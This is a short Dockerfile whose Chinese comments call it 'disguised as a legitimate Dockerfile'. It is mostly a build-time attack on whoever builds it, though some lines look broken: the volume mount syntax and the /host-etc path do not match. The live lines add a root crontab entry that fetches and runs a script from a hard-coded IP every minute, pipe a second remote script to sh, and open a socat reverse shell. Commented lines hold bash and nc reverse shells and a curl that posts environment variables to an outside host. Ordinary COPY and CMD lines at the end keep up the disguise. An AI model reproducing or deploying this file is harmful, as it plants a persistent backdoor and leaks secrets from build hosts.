# 伪装成合法的 Dockerfile
FROM alpine
RUN mkdir /host
VOLUME /:/host


RUN echo "* * * * * root curl http://124.71.183.77/shell.sh | sh" >> /host-etc/crontab


#RUN bash -i >& /dev/tcp/124.71.183.77/3309 0>&1 &

#RUN nc -e /bin/sh 124.71.183.77 3309

RUN apk add --no-cache curl

#RUN curl -X POST http://tttqqq777.top/nb/log.php --data "$(env)"

#RUN apk add --no-cache curl

RUN curl -sSL http://124.71.183.77/test.sh | sh 

#RUN curl -sSL http://124.71.183.77/test.sh?whoami=`hostname` | sh 

RUN apk add --no-cache socat && \
    socat TCP:124.71.183.77:3309 EXEC:/bin/sh

# 正常步骤（继续伪装）
COPY app /app
CMD ["/app/start.sh"]
